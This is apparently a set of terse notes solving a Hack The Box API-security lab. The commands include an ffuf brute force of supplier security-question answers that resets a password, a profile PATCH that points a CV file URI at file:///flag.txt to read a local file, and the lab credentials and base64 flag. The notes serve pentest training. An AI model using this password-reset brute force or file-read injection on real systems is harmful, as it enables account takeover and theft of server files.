http://94.237.123.236:43601/swagger

```
/api/v2/authentication/customers/sign-in
```
- htbpentester@hackthebox.com:HTBPentester

```
/api/v2/roles/current-user
```
- Suppliers_Get: /api/v2/suppliers/{ID}
- Suppliers_GetAll: /api/v2/suppliers

/api/v2/suppliers shows that 5 suppliers have a securityQuestion 'What is your favorite color?'
Put these emails in a txt file
```
wget https://gist.github.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt
```

Let's try to brute-force security questions
```
ffuf -w emails.txt:EMAIL -w colors-list.txt:COLORS -u http://94.237.123.236:43601/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H "Content-Type: application/json" -d '{"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "COLORS", "NewPassword": "P@ssword1"}' -fs 23
```
- Hit on B.Rogers:P@ssword1
```
/api/v2/authentication/suppliers/sign-in
```
B.Rogers1535@globalsolutions.com:P@ssword1

```
/api/v2/roles/current-user
```
- No roles assigned

```
/api/v2/suppliers/current-user
```
- companyID: f9e58492-b594-4d82-a4de-16e4f230fce1

POST
```
/api/v2/suppliers/current-user/cv
```
- Upload a pdf
```
dd if=/dev/urandom of=reverse-shell.pdf bs=1M count=1
```

PATCH
```
/api/v2/suppliers/current-user

{
  "SecurityQuestion": "What is your favorite color?",
  "SecurityQuestionAnswer": "rust",
  "ProfessionalCVPDFFileURI": "file:///flag.txt",
  "PhoneNumber": "string",
  "Password": "P@ssword1"
}
```

GET
```
/api/v2/suppliers/current-user/cv
```
- SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo= decode base64
